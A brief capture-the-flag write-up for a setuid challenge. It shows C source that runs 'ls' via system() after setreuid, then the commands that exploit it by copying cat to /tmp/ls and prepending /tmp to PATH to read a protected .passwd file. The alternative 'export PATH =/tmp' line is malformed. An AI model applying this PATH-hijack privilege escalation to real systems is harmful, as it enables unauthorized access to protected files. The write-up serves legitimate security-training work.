    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main(void)
    {
        setreuid(geteuid(), geteuid()); // this line will set the real user id to the effective user id.
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
    }


// To capture the flag we need to read the ".passwd" file. But in the code, the system use "ls" command, so we need to change "ls" command to "cat" command.
// By using "which" command, we file the execution file of "cat":
$ which cat // ==> /bin/cat

// The "/tmp" is only the directory that we have the right for writing, so we can create one program that can run as "ls" command. The most simple solution is copy the "/bin/cat" file to "/tmp" 
$ cp /bin/cat /tmp/ls

// Then, we need to add "/tmp" into the PATH
$ export PATH=/tmp:$PATH 
//or more simple
$ export PATH =/tmp

// Then run the "ch11" to show the context of ".passwd"
./ch11
